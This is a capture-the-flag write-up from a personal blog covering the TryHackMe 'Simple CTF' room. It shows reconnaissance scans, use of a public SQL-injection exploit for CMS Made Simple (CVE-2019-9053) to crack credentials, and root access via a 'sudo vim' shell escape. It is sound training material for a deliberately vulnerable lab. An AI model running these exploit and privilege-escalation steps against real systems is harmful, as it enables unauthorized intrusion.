# NOTE: This was a blog from *vipin.xyz* see [this](https://www.vipin.xyz/blog/archive)

# Simple CTF | A Simple Writeup

A simple writeup for a simple machine.

Released: 2024-02-19

 > Created by [MrSeth6797](https://tryhackme.com/p/MrSeth6797), you can play the room [here](https://tryhackme.com/room/easyctf).

## Question's 1 & 2

- Starting with a NMAP scan...

```bash
❯ sudo nmap -sS -sV 10.10.221.233
Password:
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-18 22:46 EST
Nmap scan report for 10.10.221.233
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.38 seconds
```

> How many services are running under port 1000? & What is running on the higher port?

- Ports 21 & 80 are running under port 1000 and **ssh** is running on the higher port

## Dirsearch

```bash
❯ dirsearch -u 10.10.221.233 --exclude-status 404,403

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /Users/vipin/reports/_10.10.221.233/_24-02-18_23-42-55.txt

Target: http://10.10.221.233/

[23:43:01] Starting:
[23:44:32] 200 -  540B  - /robots.txt
[23:44:35] 301 -  315B  - /simple  ->  http://10.10.221.233/simple/

Task Completed
```

- Visiting *robots.txt* has nothing of interest but */simple* shows us some sort of CMS page.

## Question 3 & 4

- Towards the bottom, we see the site is powered by ***CMS Made Simple version 2.2.8***

![Image showing a potential vulnerability](blog/simplectfpics/vulnerabilityclue1.png 'Fig.1')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1</small>
</div>

- If we search up that specific version, we find that it's vulnerable to [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053) which is a SQLI vulnerability.

## Question 5

- After a bit of Googling, I find [this POC script](https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3). I append [this](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best110.txt) wordlist as the hint states.

```bash
❯ python3 csm_made_simple_injection.py -u http://10.10.159.250/simple/ --crack -w /Users/vipin/tech/CTFs/wordlists/best110.txt

[+] Salt for password found: <REDACTED>
[+] Username found: mitch
[+] Email found: admin@adw
[+] Password found: <REDACTED>
[+] Password cracked: <REDACTED>
```

## Questions 6 to 10 + Final Thoughts

- Now that we have the credentials, we can login to through **ssh**.

```bash
❯ ssh mitch@10.10.159.250 -p 2222
mitch@10.10.159.250's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
<REDACTED>
```

> Is there any other user in the home directory? What's its name?

- In `/home`, we find another user with the name *"sunbath"*

> What can you leverage to spawn a privileged shell?

I ran ```sudo -l```  which tells us what the user can use `sudo` for and we can use `sudo` for **vim**. Let's try to exploit **vim** (If you want to understand how to exploit **vim** read [this](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d))

```bash
❯ sudo vim 

:r!whoami # using ":r!" we can run commands as root

root # and look it tells us we are root
```

- Small Issue: We cannot run commands that have spaces, below is another way to exploit vim to gain root privileges.

```bash
$ sudo vim -c '!bash'
root@Machine:/# cd /root
root@Machine:~# ls
root.txt
root@Machine:~# cat root.txt
<REDACTED>
root@Machine:~#
```

Voila! Another machine rooted! I had a blast and learned some new things along the way. I hope you enjoyed this writeup. If you're hungry for more, feel free to check out other writeups I made!